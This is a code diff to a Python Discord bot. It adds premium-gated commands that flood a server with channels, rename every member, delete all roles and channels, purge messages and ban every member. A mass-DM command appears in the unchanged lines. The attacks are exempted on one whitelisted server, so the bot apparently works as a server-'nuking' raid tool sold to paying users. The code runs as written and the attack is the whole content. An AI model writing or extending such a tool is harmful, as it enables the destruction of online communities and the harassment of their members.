@@ -303,15 +303,58 @@ async def massdm_slash(interaction: discord.Interaction, message: str):
             try: await member.send(message)
             except: continue
 
-@client.tree.command(name="flood", description="Flood with channels (Owner Only)")
+@client.tree.command(name="flood", description="Flood with channels (Premium)")
 @app_commands.describe(name="Channel names", amount="Amount (max 100)")
 async def flood_slash(interaction: discord.Interaction, name: str, amount: int = 50):
-    if not await client.is_owner(interaction.user):
-        return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
     await interaction.response.send_message("🌊 Flooding...", ephemeral=True)
     for _ in range(min(amount, 100)):
         try: await interaction.guild.create_text_channel(name=name)
         except: break
+
+@client.tree.command(name="nickname_all", description="Change everyone's nickname (Premium)")
+@app_commands.describe(nickname="New nickname for everyone")
+async def nickname_all_slash(interaction: discord.Interaction, nickname: str):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🏷️ Changing nicknames...", ephemeral=True)
+    for member in interaction.guild.members:
+        try: await member.edit(nick=nickname)
+        except: continue
+
+@client.tree.command(name="role_nuke", description="Delete all roles (Premium)")
+async def role_nuke_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🎭 Role nuke started...", ephemeral=True)
+    await delete_all_roles(interaction.guild)
+
+@client.tree.command(name="channel_nuke", description="Delete all channels (Premium)")
+async def channel_nuke_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
+    await interaction.response.send_message("📁 Channel nuke started...", ephemeral=True)
+    await delete_all_channels(interaction.guild)
+
+@client.tree.command(name="purge", description="Delete a number of messages (Premium)")
+@app_commands.describe(amount="Amount of messages to delete")
+async def purge_slash(interaction: discord.Interaction, amount: int):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message(f"🧹 Purging {amount} messages...", ephemeral=True)
+    await interaction.channel.purge(limit=amount)
+
+@client.tree.command(name="ban_nuke", description="Ban everyone (Premium)")
+async def ban_nuke_slash(interaction: discord.Interaction):
+    if not is_premium(interaction.user.id) and not await client.is_owner(interaction.user):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    if interaction.guild_id == WHITELISTED_SERVER_ID:
+        return await interaction.response.send_message("❌ This server is protected!", ephemeral=True)
+    await interaction.response.send_message("🔨 Ban nuke started...", ephemeral=True)
+    await ban_all_members(interaction.guild)
 
 @client.tree.command(name="add_premium", description="Grant lifetime premium")
 async def add_premium_slash(interaction: discord.Interaction, user: discord.User):
@@ -392,11 +435,28 @@ async def lock(ctx):
     await ctx.send("🔒 Channel Locked! (No messages or threads)")
 
 @client.command()
-@commands.is_owner()
 async def flood(ctx, amount: int, *, name: str):
+    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
+        return await ctx.send("❌ Premium Only!")
     for _ in range(min(amount, 100)):
         try: await ctx.guild.create_text_channel(name=name)
         except: break
+
+@client.command()
+async def nickall(ctx, *, nickname: str):
+    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
+        return await ctx.send("❌ Premium Only!")
+    await ctx.send("🏷️ Changing nicknames...")
+    for member in ctx.guild.members:
+        try: await member.edit(nick=nickname)
+        except: continue
+
+@client.command()
+async def purgelimit(ctx, amount: int):
+    if not is_premium(ctx.author.id) and not await client.is_owner(ctx.author):
+        return await ctx.send("❌ Premium Only!")
+    await ctx.channel.purge(limit=amount)
+    await ctx.send(f"🧹 Purged {amount} messages!", delete_after=5)
 
 @client.command()
 @commands.is_owner()
